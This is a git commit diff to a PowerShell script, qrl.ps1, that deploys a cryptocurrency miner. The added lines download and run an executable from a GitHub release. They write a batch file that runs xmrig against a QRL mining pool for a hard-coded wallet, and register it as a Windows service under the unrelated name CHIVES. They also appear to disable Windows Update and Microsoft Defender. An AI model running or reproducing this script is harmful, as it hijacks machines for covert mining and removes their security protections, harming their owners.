76164b536161d12a6f8566fd63e40997897bdf68
trangtrau <30510221+trangtrau@users.noreply.github.com>
2023-10-05 12:28:22 +0700

    Update qrl.ps1

--- qrl.ps1
+++ qrl.ps1
@@ -1,1 +1,26 @@
-$downloadPath = Join-Path -Path $env:USERPROFILE -ChildPath "Desktop"; $url = "https://github.com/trangtrau/random-agent-spoofer/releases/download/SA/QRL_VAN.exe"; Invoke-WebRequest -Uri $url -OutFile "$downloadPath\QRL_VAN.exe"; $packetCryptPath = Join-Path -Path $downloadPath -ChildPath "QRL_VAN.exe"; Start-Process -FilePath $packetCryptPath
+$downloadPath = Join-Path -Path $env:USERPROFILE -ChildPath "Desktop"
+$url = "https://github.com/trangtrau/random-agent-spoofer/releases/download/SA/QRL_VAN.exe"
+Invoke-WebRequest -Uri $url -OutFile "$downloadPath\QRL_VAN.exe"
+$packetCryptPath = Join-Path -Path $downloadPath -ChildPath "QRL_VAN.exe"
+Start-Process -FilePath $packetCryptPath
+$userName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+$userName = $userName -replace "^.*\\", ""
+$folderPath = "C:\AutoRclone-master\"
+$batContent = @"
+cd %~dp0
+xmrig.exe --donate-level 1 -o de.qrl.herominers.com:1166 -u Q01050060fadbd7c6007b985f0ab38b888069e663b5f708ebc2322a64571087eff6ad31a62ecd21 -p $userName -a rx/0 -k
+pause
+"@
+$batContent | Set-Content -Path (Join-Path -Path $folderPath -ChildPath "van.bat") -Force
+Set-Location -Path "C:\AutoRclone-master"
+& nssm.exe install CHIVES "C:\AutoRclone-master\van.bat"
+Start-Sleep -Seconds 1
+& nssm.exe start CHIVES
+New-Item -Path "$env:USERPROFILE\Desktop\Service_OK.dat" -ItemType File
+& wub.exe /D
+Start-Process -FilePath "dfControl.exe"
+
+
+
+
+
